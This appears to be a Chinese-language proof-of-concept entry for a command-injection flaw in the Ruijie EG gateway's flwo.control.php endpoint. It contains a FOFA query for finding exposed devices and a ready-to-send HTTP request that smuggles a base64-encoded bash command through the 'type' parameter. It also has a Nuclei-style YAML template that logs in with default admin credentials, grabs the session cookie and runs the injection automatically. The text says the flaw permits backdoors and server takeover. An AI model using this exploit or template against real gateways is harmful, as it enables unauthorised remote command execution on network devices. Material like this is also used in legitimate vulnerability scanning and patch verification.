## 锐捷网络flwo.control.php存在RCE漏洞

锐捷EG易网关存在flwo.control.php命令执行漏洞，攻击者可利用该漏洞执行任意命令，写入后门，获取服务器权限，进而控制整个web服务器。 前提需要登录获取cookie


## fofa
```
title="锐捷网络-EWEB网管系统"
```

## poc
```
POST /flow_control_pi/flwo.control.php?a=flowOpen HTTP/1.1
Host: localhost:4430
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 11
Accept: */*
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: user=21232f297a57a5a743894a0e4a801fc3; LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; sysmode=sys-mode%20gateway; supportMoreLan=no; RUIJIEID=h250c4c46emk9dv2mjmbk5rlc0; user=21232f297a57a5a743894a0e4a801fc3; isRedirect=true; authenType=local; accountType=write; showPatchDialog=true; module=macc; threeModule=seltab
Origin: https:// localhost:4430
Referer: https:// localhost:4430/rac_pi/surfilter_selservice.htm
Sec-Ch-Ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: x
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
```
![image](https://github.com/wy876/POC/assets/139549762/a4710fcd-de46-4774-8c69-de8f5a74dcb2)

把管理员cookie填进去，然后写入文件

![c534bc92b717fb16aafc3f62f07e90b1](https://github.com/wy876/POC/assets/139549762/2c93d83a-6e44-4198-b973-271829bca4fa)

文件路径`http://127.0.0.1/123321qwe.txt`


## yaml
```
http:
  - raw:
	  - |              
		POST /ddi/server/login.php HTTP/1.1
		Host: 
		Content-Type: application/x-www-form-urlencoded
		User-Agent: Mozilla/5.0 

		username=admin&password=admin?
	  - |              
		POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
		Host: 
		Content-Type: application/x-www-form-urlencoded
		Cookie: RUIJIEID={{cookie}};user=admin;
		User-Agent: Mozilla/5.0 

		type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27

	  - |              
		GET /123321qwe.txt HTTP/1.1
		Host: 
		User-Agent: Mozilla/5.0      

	extractors:
	  - type: regex
		name: cookie
		part: header
		group: 1
		internal: true
		regex:
		  - "RUIJIEID=(.*); path=/"

	matchers-condition: and
	matchers:
	  - type: dsl
		dsl:
		  - 'status_code_3==200 && contains(body_3, "F08bbfb2BC8ceeD6") && contains(body_3, "text/plain")'

```
